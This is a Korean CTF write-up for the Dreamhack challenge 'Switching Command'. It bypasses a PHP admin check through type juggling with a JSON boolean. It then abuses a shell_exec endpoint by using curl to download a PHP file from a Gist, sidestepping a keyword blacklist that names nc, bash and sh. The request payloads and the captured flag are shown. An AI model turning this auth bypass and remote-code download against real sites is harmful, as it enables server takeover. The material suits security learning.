# S4 · Switching Command

### 1. VM에 접속한다

<img width="1274" height="453" alt="image" src="https://github.com/user-attachments/assets/1347d451-42ba-447e-a412-cdb8996f5b6b" />


### 2. 코드 분석 — PHP Type Juggling으로 관리자 인증 우회

**① `index.php`의 비교 방식이 다르다.**

```php
$data = json_decode($_POST["username"]);
$username = $data->username;

if ($username === "admin") {
    exit("no hack");
}

switch ($username) {
    case "admin":
        $user = "admin";
        $password = "***REDACTED***";
  
        break;
    default:
        $_SESSION["auth"] = "guest";
        header("Location: test.php");
}
```

- `===`는 **값과 자료형을 모두 비교**하므로, Boolean `true`는 문자열 `"admin"`과 일치하지 않는다.
- 반면 `switch`의 `case` 비교는 느슨한 비교(`==`)**를 사용한다. PHP 8에서 `true == "admin"`은 참이므로 관리자 분기에 진입할 수 있다.

 - 느슨한 비교(==)가 Boolean과 문자열을 비교할 때 문자열을 Boolean으로 변환

  ```php
      (bool) "admin"  // true
      (bool) "hello"  // true
      (bool) "1"      // true
      (bool) ""       // false
      (bool) "0"      // false
  ```
  
- 해당 분기는 사용자가 보낸 값을 DB 비밀번호로 쓰지 않고, 코드에 고정된 관리자 계정 정보로 조회한다. `deploy/mysql_init/init.sql`에도 `admin` 계정이 등록되어 있다.

Burp Suite Repeater에서 보낸 POST 요청:

```http
POST /index.php HTTP/1.1
Host: host3.dreamhack.games:21271
Content-Type: application/x-www-form-urlencoded

username=%7B%22username%22%3Atrue%7D
```

`%7B%22username%22%3Atrue%7D`는 `{"username":true}`를 URL 인코딩한 값이다.

PHP의 `switch`문은 느슨한 비교(`==`)를 사용하므로, `username`에 Boolean `true`를 전달하면 `case "admin"`과 일치하여 관리자 분기로 진입할 수 있다.

```text
true === "admin" → false (차단 조건 통과)
switch(true) → case "admin" 일치
DB 조회 결과 1건 → $_SESSION["auth"] = "admin"
```
<img width="526" height="191" alt="image" src="https://github.com/user-attachments/assets/2568f599-f88b-471d-8e96-770ed111dd44" />
<img width="544" height="264" alt="image" src="https://github.com/user-attachments/assets/ff18c90e-bb59-4986-83fc-c881278efaf4" />



### 3. 코드 분석 — `test.php`의 명령 실행

관리자 세션일 때 `cmd` 파라미터를 서버 명령으로 실행한다.

```php
include("./config.php");
$pattern = '/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i';

if ($_SESSION["auth"] === "admin") {
    $command = isset($_GET["cmd"]) ? $_GET["cmd"] : "ls";
    $sanitized_command = str_replace("\n", "", $command);
    if (preg_match($pattern, $sanitized_command)) {
        exit("No hack");
    }
    $resulttt = shell_exec(escapeshellcmd($sanitized_command));
}
```

- `config.php`의 `session_start()`가 세션을 유지한다.
- `preg_match()`는 `flag`, `bash`, `sh` 등의 단어를 차단하고, `escapeshellcmd()`는 일부 셸 특수문자를 이스케이프한다.
- 하지만 `shell_exec()`에는 여전히 사용자가 지정한 명령이 전달되므로, 허용된 명령은 서버에서 실행된다.

**실행 결과가 보이지 않는 이유**도 코드에 있다.

```php
$resulttt = shell_exec(...);  // 실제 실행 결과 저장
echo "<pre>$result</pre>";   // HTML에서 다른 변수를 출력
```

관리자 분기는 `$resulttt`에 저장하지만 화면에서는 `$result`를 출력해, 실행된 명령의 출력이 보이지 않는다.

### 4. Gist에서 `run.php` 가져오기

`/flag`를 직접 `cmd`에 입력하면 `flag` 단어가 블랙리스트에 걸린다. 그래서 외부 PHP 파일에 실행 코드를 넣고 이를 서버로 내려받는 방식을 사용했다.


https://gist.github.com/ 해당 링크에 접속한다

<img width="1437" height="708" alt="image" src="https://github.com/user-attachments/assets/0592480c-ba25-4120-97c3-f6c8f7d94dc4" />

<img width="1013" height="249" alt="image" src="https://github.com/user-attachments/assets/c002eed4-a00c-4518-93fc-44920adcede8" />

사진처럼 입력하고 생성한다


**Gist의 `run.php` 내용**

```php
<?php
passthru('/flag');
?>
```
왜 cat flag가 아니라 passthru로 운영체제 명령어처럼 실행할까?


```dockerfile
COPY ./flag.c /flag.c
RUN gcc /flag.c -o /flag && \
    chmod 111 /flag && \
    rm /flag.c
```

바로 flag.c가 컴파일 되서 실행파일이 되었기 때문이다.

RUN gcc /flag.c -o /flag



<img width="1095" height="394" alt="image" src="https://github.com/user-attachments/assets/297baed8-ca32-4256-89c8-04cc3206c4aa" />

생성이 완료 됐으면 raw 를 클릭 후 url을 복사한다

<img width="1205" height="253" alt="image" src="https://github.com/user-attachments/assets/96f8802f-4d54-47bc-a48b-682b7623ba0b" />


관리자 세션을 유지한 상태에서 Burp Repeater로 다음 요청을 보낸다.

<img width="529" height="160" alt="image" src="https://github.com/user-attachments/assets/27d82cd4-118f-4a1f-80f3-ff04a31fc798" />

<img width="316" height="160" alt="image" src="https://github.com/user-attachments/assets/50b2183f-ce14-4ad3-b887-ab5c49e76e15" />

<img width="535" height="287" alt="image" src="https://github.com/user-attachments/assets/11be12dc-84ec-4f06-b74d-f56313a6ea43" />


```http
GET /test.php?cmd=curl%20-fsSL%20<GIST_RAW_URL>%20-o%20run.php HTTP/1.1
Host: <서버주소:포트>
Cookie: PHPSESSID=<관리자_세션_ID>
```

``` text
- GIST_RAW_URL : 본인이 만든 run.php의 Gist Raw URL (실제 요청에서는 URL 인코딩)
- 서버주소:포트 : 본인의 Dreamhack VM 주소
- 관리자_세션_ID : 인증 우회 후 발급받은 PHP 세션 ID

실제로 실행하도록 전달한 명령은 다음과 같다.
```

### 5. `run.php` 실행 후 FLAG 확인

http://host3.dreamhack.games:<본인의 vm 포트번호>/run.php에 접속하여 서버의 웹 디렉터리에 저장된 run.php에 접근한다

<img width="614" height="140" alt="image" src="https://github.com/user-attachments/assets/22aca2ff-9405-4104-b982-dca10c5f377f" />



```text
GET /run.php
    ↓
PHP가 run.php 실행
    ↓
passthru('/flag')
    ↓
/flag 실행 파일의 표준 출력이 HTTP 응답에 표시
```



**확인한 FLAG**

```text
DH{3301f7d38317ccfa063c21e5a10e2b6b1f0489d0114d053f34805f44788341c2}
```

> **취약점 원인:** `index.php`에서 엄격 비교(`===`)와 느슨한 `switch` 비교를 혼용하여 관리자 인증을 우회할 수 있었다. 이어 `test.php`가 관리자에게 허용한 OS 명령 실행 기능과 단순 블랙리스트를 이용해 별도 PHP 파일을 실행했다.
